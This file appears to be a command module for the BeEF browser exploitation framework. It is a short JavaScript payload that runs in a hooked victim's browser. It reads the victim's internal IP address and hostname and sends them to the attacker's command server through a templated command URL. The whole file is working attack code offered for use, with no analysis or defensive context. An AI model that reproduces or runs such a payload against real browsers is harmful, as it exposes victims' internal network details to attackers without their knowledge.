beef.execute(function() {
	
	var internal_ip = beef.net.local.getLocalAddress();
	var internal_hostname = beef.net.local.getLocalHostname();

	if(internal_ip && internal_hostname) {
		beef.net.send('<%= @command_url %>', <%= @command_id %>,
			'internal_ip='+internal_ip+'&internal_hostname='+internal_hostname);
	}
});
